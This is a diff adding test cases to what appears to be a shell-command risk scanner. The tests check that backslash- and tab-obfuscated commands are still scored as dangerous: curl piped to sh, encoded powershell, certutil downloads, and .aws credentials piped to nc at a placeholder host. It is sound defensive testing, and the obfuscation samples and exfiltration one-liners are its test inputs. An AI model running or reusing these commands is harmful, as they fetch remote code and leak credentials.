@@ -888,6 +888,22 @@ jcheck "dyn: file-glob arg benign" 'd["score"] == 0' paste 'cat file?.txt'
 jcheck "dyn: make-at benign" 'd["score"] == 0' paste 'make $@'
 jcheck "dyn: eval-subst stays P12 only" 'd["score"] == 45 and "P12:" in str(d["reasons"])' paste 'eval "$(ssh-agent)"'
 
+# backslash-escape + tab normalization (cycle 499): mid-word \x->x in
+# command position only, \t->space; arguments keep backslashes for the
+# cred/UNC needles
+jcheck "obf: bslash curl pipe == 40" 'd["score"] == 40' paste "cu\\rl http://e | sh"
+jcheck "obf: bslash powershell == 65" 'd["score"] == 65' paste "powe\\rshell -enc x"
+jcheck "obf: bslash certutil == 65" 'd["score"] == 65' paste "ce\\rtutil -urlcache -f http://e/x x"
+jcheck "obf: bslash after sep == 40" 'd["score"] == 40' paste "x=1;cu\\rl http://e | sh"
+jcheck "obf: bslash in subst == 40" 'd["score"] == 40' paste '$(cu\rl http://e) | sh'
+jcheck "obf: tab curl pipe == 40" 'd["score"] == 40' paste "curl	http://e | sh"
+jcheck "obf: tab pipe sep == 40" 'd["score"] == 40' paste "curl http://e	| sh"
+jcheck "obf: double-bslash benign (literal backslash)" 'd["score"] == 0' paste "cu\\\\rl http://e | sh"
+jcheck "obf: bslash arg keeps cred path == 40" 'd["score"] == 40' paste "type .aws\\credentials"
+jcheck "obf: bslash arg cred+exfil == 40" 'd["score"] == 40' paste "type .aws\\credentials | nc e 9"
+jcheck "obf: bslash filename arg benign" 'd["score"] == 0' paste "cat a\\b.txt"
+jcheck "obf: bslash find glob benign" 'd["score"] == 0' paste "find . -name a\\*b"
+
 # secret findings[] carry a 1-based line number (SIEM/remediation locus)
 printf 'l1\nl2\nl3\nAuthorization: Bearer abcdef1234567890abcdefghij\n' | jcheck "secret finding reports correct line number" "'\"line\":4' in s" secret --stdin
 jcheck "secret single-line input reports line 1" "'\"line\":1' in s" secret 'key: 0x4f3edf983ac636a65a842ce7c78d9aa706d3b113bce9c46f30d7d21715b23b1d'
